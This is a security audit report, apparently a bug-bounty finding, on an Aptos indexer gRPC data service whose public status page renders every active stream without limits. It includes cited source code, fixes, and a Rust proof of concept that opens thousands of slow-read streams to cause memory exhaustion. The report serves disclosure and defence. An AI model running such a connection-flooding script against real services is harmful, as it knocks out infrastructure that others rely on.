# Audit Report

## Title
Resource Exhaustion via Unbounded Stream Accumulation in Indexer gRPC Status Page

## Summary
The indexer-grpc-data-service-v2 status page renders all active gRPC streams without pagination or limits, allowing an attacker to create tens of thousands of concurrent connections that cause memory exhaustion and CPU starvation when the status page is accessed. The service lacks rate limiting on concurrent stream creation and the status page endpoint is publicly accessible.

## Finding Description

The indexer-grpc-data-service-v2 allows unlimited concurrent gRPC streams from clients requesting blockchain transaction data. Each stream is tracked in a `DashMap` and persists until the client disconnects or the stream completes. When the status page is accessed, the system renders ALL active streams without pagination. [1](#0-0) [2](#0-1) 

The `get_active_streams()` method clones all streams and their progress samples into a Vec: [3](#0-2) 

Each stream contains progress samples (up to 120 samples per stream): [4](#0-3) 

**Attack Path:**

1. Attacker opens 100,000+ concurrent gRPC `GetTransactions` connections to either the live or historical data service
2. Each connection creates a stream via `insert_active_stream()`: [5](#0-4) 

3. Attacker keeps connections alive by reading data slowly or pausing (HTTP/2 keepalive allows 60s intervals)
4. There is NO limit on concurrent streams in the configuration: [6](#0-5) 

5. The status page is publicly accessible on the health_check_port bound to all interfaces (0.0.0.0): [7](#0-6) [8](#0-7) 

6. When the status page is accessed, it allocates ~500MB+ memory (100,000 streams Ã— ~5KB each) and consumes significant CPU time rendering 100,000 HTML table rows with 6 cells each
7. Multiple concurrent status page accesses multiply the resource consumption, potentially causing OOM crashes

**Broken Invariant:** Resource Limits - "All operations must respect gas, storage, and computational limits." The status page rendering operation has no resource limits and can consume unbounded memory/CPU.

## Impact Explanation

This vulnerability qualifies as **HIGH severity** per the Aptos bug bounty program because it causes:

1. **API Crashes** - The status page and monitoring endpoints share the same health_check_port. Memory exhaustion can crash the entire monitoring service.

2. **Service Degradation** - The indexer service provides critical infrastructure for blockchain data access. Resource exhaustion degrades service availability for all clients.

3. **Monitoring Disruption** - The status page, metrics endpoint (`/metrics`), and readiness probe (`/readiness`) all run on the same port. A DoS on the status page affects all observability infrastructure.

4. **Cascading Failures** - If automated monitoring systems repeatedly access the status page (e.g., every minute), each access triggers resource exhaustion, creating a cascading failure loop.

While this is not a validator node, the indexer service is critical infrastructure for the Aptos ecosystem, and the vulnerability allows unprivileged attackers to cause service unavailability through application-layer resource exhaustion.

## Likelihood Explanation

**Likelihood: HIGH**

The attack requires:
- No authentication or special privileges
- Simple gRPC client that can open connections (widely available tools like `grpcurl`)
- Ability to keep connections open (trivial with slow reading or client pauses)

The attack is highly feasible because:
1. No rate limiting on connection creation exists in the codebase
2. No maximum concurrent stream limit is enforced
3. Status page is publicly accessible without authentication
4. HTTP/2 keepalive (60s interval) allows long-lived connections
5. Attacker can script connection creation and maintenance easily

## Recommendation

Implement multiple layers of protection:

**1. Add Maximum Concurrent Streams Limit:**
```rust
pub struct IndexerGrpcDataServiceConfig {
    // ... existing fields ...
    #[serde(default = "IndexerGrpcDataServiceConfig::default_max_concurrent_streams")]
    pub max_concurrent_streams: usize,
}

impl IndexerGrpcDataServiceConfig {
    const fn default_max_concurrent_streams() -> usize {
        1000 // Reasonable limit
    }
}
```

**2. Implement Rate Limiting in ConnectionManager:**
```rust
impl ConnectionManager {
    pub(crate) fn insert_active_stream(&self, id: &str, start_version: u64, end_version: Option<u64>) -> Result<(), Status> {
        if self.active_streams.len() >= self.max_concurrent_streams {
            return Err(Status::resource_exhausted("Maximum concurrent streams exceeded"));
        }
        // ... existing insertion logic ...
    }
}
```

**3. Add Pagination to Status Page:**
```rust
fn render_connection_manager_info(connection_manager: &ConnectionManager) -> Container {
    let known_latest_version = connection_manager.known_latest_version();
    let active_streams = connection_manager.get_active_streams();
    
    // Limit rendering to first 100 streams
    const MAX_STREAMS_TO_DISPLAY: usize = 100;
    let display_count = active_streams.len().min(MAX_STREAMS_TO_DISPLAY);
    let total_count = active_streams.len();
    
    let active_streams_table = active_streams.into_iter()
        .take(MAX_STREAMS_TO_DISPLAY)
        .fold(/* ... existing fold logic ... */);
    
    Container::new(ContainerType::Section)
        .with_paragraph(format!("Showing {} of {} active streams", display_count, total_count))
        // ... rest of container ...
}
```

**4. Consider Authentication for Status Page:**
Add basic authentication or IP allowlisting for the status endpoint to prevent public access.

## Proof of Concept

```rust
// PoC: Create many concurrent gRPC streams to exhaust resources
use tokio;
use tonic::Request;
use aptos_protos::indexer::v1::{
    data_service_client::DataServiceClient, GetTransactionsRequest,
};

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let target = "http://indexer-service:50051"; // Replace with actual endpoint
    
    println!("Starting resource exhaustion attack...");
    
    let mut handles = vec![];
    
    // Create 10,000 concurrent streams (scale to 100,000 for full impact)
    for i in 0..10_000 {
        let target = target.to_string();
        let handle = tokio::spawn(async move {
            let mut client = DataServiceClient::connect(target).await.unwrap();
            
            let request = Request::new(GetTransactionsRequest {
                starting_version: Some(0),
                transactions_count: Some(1_000_000), // Request lots of data
                batch_size: Some(1), // Small batches to slow down
                transaction_filter: None,
            });
            
            // Open stream but don't read, keeping it alive
            let mut stream = client.get_transactions(request).await.unwrap().into_inner();
            
            // Read very slowly to keep connection alive
            loop {
                tokio::time::sleep(tokio::time::Duration::from_secs(30)).await;
                if let Some(_) = stream.message().await.unwrap() {
                    // Slowly consume to avoid completion
                }
            }
        });
        handles.push(handle);
        
        if i % 100 == 0 {
            println!("Created {} streams", i);
        }
    }
    
    println!("All streams created. Now access http://indexer-service:8080/ to trigger resource exhaustion");
    
    // Keep streams alive
    futures::future::join_all(handles).await;
    
    Ok(())
}
```

**Test Steps:**
1. Deploy indexer-grpc-data-service-v2 with default configuration
2. Run the PoC script to create 10,000+ concurrent streams
3. Access the status page at `http://<service>:<health_check_port>/`
4. Observe memory consumption spike to 50MB+ and CPU saturation for several seconds
5. With 100,000 streams, expect 500MB+ memory allocation and potential OOM crash

---

**Notes:**

This vulnerability is specific to the indexer service's monitoring infrastructure and does not directly impact consensus, validator operations, or fund security. However, it represents a significant availability issue for critical Aptos ecosystem infrastructure that provides blockchain data access to applications and users.

### Citations

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/status_page.rs (L46-48)
```rust
fn render_connection_manager_info(connection_manager: &ConnectionManager) -> Container {
    let known_latest_version = connection_manager.known_latest_version();
    let active_streams = connection_manager.get_active_streams();
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/status_page.rs (L49-101)
```rust
    let active_streams_table = active_streams.into_iter().fold(
        Table::new()
            .with_attributes([("style", "width: 100%; border: 5px solid black;")])
            .with_thead_attributes([("style", "background-color: lightcoral; color: white;")])
            .with_custom_header_row(
                TableRow::new()
                    .with_cell(TableCell::new(TableCellType::Header).with_raw("Id"))
                    .with_cell(TableCell::new(TableCellType::Header).with_raw("Current Version"))
                    .with_cell(TableCell::new(TableCellType::Header).with_raw("End Version"))
                    .with_cell(
                        TableCell::new(TableCellType::Header).with_raw("Past 10s throughput"),
                    )
                    .with_cell(
                        TableCell::new(TableCellType::Header).with_raw("Past 60s throughput"),
                    )
                    .with_cell(
                        TableCell::new(TableCellType::Header).with_raw("Past 10min throughput"),
                    ),
            ),
        |table, active_stream| {
            table.with_custom_body_row(
                TableRow::new()
                    .with_cell(TableCell::new(TableCellType::Data).with_raw(&active_stream.id))
                    .with_cell(TableCell::new(TableCellType::Data).with_raw(format!(
                        "{:?}",
                        active_stream.progress.as_ref().and_then(|progress| {
                            progress.samples.last().map(|sample| sample.version)
                        })
                    )))
                    .with_cell(
                        TableCell::new(TableCellType::Data).with_raw(active_stream.end_version()),
                    )
                    .with_cell(TableCell::new(TableCellType::Data).with_raw(
                        get_throughput_from_samples(
                            active_stream.progress.as_ref(),
                            Duration::from_secs(10),
                        ),
                    ))
                    .with_cell(TableCell::new(TableCellType::Data).with_raw(
                        get_throughput_from_samples(
                            active_stream.progress.as_ref(),
                            Duration::from_secs(60),
                        ),
                    ))
                    .with_cell(TableCell::new(TableCellType::Data).with_raw(
                        get_throughput_from_samples(
                            active_stream.progress.as_ref(),
                            Duration::from_secs(600),
                        ),
                    )),
            )
        },
    );
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/connection_manager.rs (L26-29)
```rust
static OLD_PROGRESS_SAMPLING_RATE: Duration = Duration::from_secs(60);
static RECENT_PROGRESS_SAMPLING_RATE: Duration = Duration::from_secs(1);
static MAX_RECENT_SAMPLES_TO_KEEP: usize = 60;
static MAX_OLD_SAMPLES_TO_KEEP: usize = 60;
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/connection_manager.rs (L235-247)
```rust
    pub(crate) fn get_active_streams(&self) -> Vec<ActiveStream> {
        self.active_streams
            .iter()
            .map(|entry| {
                let (active_stream, samples) = entry.value();
                let mut active_stream = active_stream.clone();
                active_stream.progress = Some(StreamProgress {
                    samples: samples.to_proto(),
                });
                active_stream
            })
            .collect()
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/live_data_service/mod.rs (L167-168)
```rust
        self.connection_manager
            .insert_active_stream(&id, starting_version, ending_version);
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/config.rs (L85-96)
```rust
pub struct IndexerGrpcDataServiceConfig {
    pub(crate) chain_id: u64,
    pub(crate) service_config: ServiceConfig,
    pub(crate) live_data_service_config: LiveDataServiceConfig,
    pub(crate) historical_data_service_config: HistoricalDataServiceConfig,
    pub(crate) grpc_manager_addresses: Vec<String>,
    pub(crate) self_advertised_address: String,
    #[serde(default = "IndexerGrpcDataServiceConfig::default_max_transaction_filter_size_bytes")]
    pub(crate) max_transaction_filter_size_bytes: usize,
    #[serde(default = "IndexerGrpcDataServiceConfig::default_data_service_response_channel_size")]
    pub data_service_response_channel_size: usize,
}
```

**File:** ecosystem/indexer-grpc/indexer-grpc-server-framework/src/lib.rs (L219-222)
```rust
    let status_endpoint = warp::path::end().and_then(move || {
        let config = config.clone();
        async move { config.status_page().await }
    });
```

**File:** ecosystem/indexer-grpc/indexer-grpc-server-framework/src/lib.rs (L257-258)
```rust
        .run(([0, 0, 0, 0], port))
        .await;
```
